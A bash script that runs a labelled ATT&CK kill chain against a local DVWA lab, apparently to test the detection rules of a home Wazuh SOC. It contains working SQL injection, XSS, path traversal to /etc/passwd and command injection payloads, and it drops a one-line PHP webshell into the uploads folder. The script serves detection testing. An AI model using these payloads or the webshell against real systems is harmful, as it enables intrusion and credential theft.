#!/bin/bash
# ATT&CK-mapped attack chain against DVWA — home SOC lab.
# Runs a labeled kill-chain of attacks that this lab's Wazuh ruleset detects.
# Each step notes the MITRE technique and the Wazuh rule it should trigger.
# Run from a host that can reach DVWA over HTTP.
U="http://localhost/dvwa"; C=/tmp/ac.cookies
say(){ echo -e "\n[\033[1;36m$1\033[0m] $2"; }

# --- authenticate (sets up the success-detection steps) ---
T=$(curl -s -c $C "$U/login.php" | grep -oP "user_token'?\s*value='\K[a-f0-9]{32}")
curl -s -b $C -c $C -o /dev/null -d "username=admin&password=password&user_token=$T&Login=Login" "$U/login.php"
ST=$(curl -s -b $C -c $C "$U/security.php" | grep -oP "user_token'?\s*value='\K[a-f0-9]{32}")
curl -s -b $C -c $C -o /dev/null -d "security=low&seclev_submit=Submit&user_token=$ST" "$U/security.php"

say "T1595.003" "Reconnaissance — content/directory enumeration (Wazuh 100013/100016)"
for i in $(seq 1 20); do curl -s -o /dev/null "$U/notreal_$i.php"; done
curl -s -o /dev/null "$U/../../.git/config"; curl -s -o /dev/null "$U/config.php.bak"

say "T1190" "Initial Access — SQLi, XSS, traversal, cmd injection (100040/42/43/44)"
curl -s -b $C -o /dev/null -G "$U/vulnerabilities/sqli/" --data-urlencode "id=1' UNION SELECT user,password FROM users-- -" --data-urlencode "Submit=Submit"
curl -s -b $C -o /dev/null -G "$U/vulnerabilities/xss_r/" --data-urlencode "name=<script>alert(1)</script>"
curl -s -b $C -o /dev/null -G "$U/vulnerabilities/fi/" --data-urlencode "page=../../../../etc/passwd"
curl -s -b $C -o /dev/null -G "$U/vulnerabilities/exec/" --data-urlencode "ip=127.0.0.1;id" --data-urlencode "Submit=Submit"

say "T1190" "Exploitation confirmed — SQLi returning HTTP 200 (100045 SUCCESS)"
curl -s -b $C -o /dev/null "$U/vulnerabilities/sqli/?id=1'+UNION+SELECT+user,password+FROM+users--+-&Submit=Submit"

say "T1505.003" "Persistence — webshell dropped in web root (100030 + quarantine + YARA 108001)"
echo '<?php system($_GET["cmd"]); ?>' > /var/www/html/dvwa/hackable/uploads/ac_shell.php 2>/dev/null || echo "  (drop blocked/quarantined)"

say "DONE" "Attack chain complete — check Wazuh alerts and notifications."
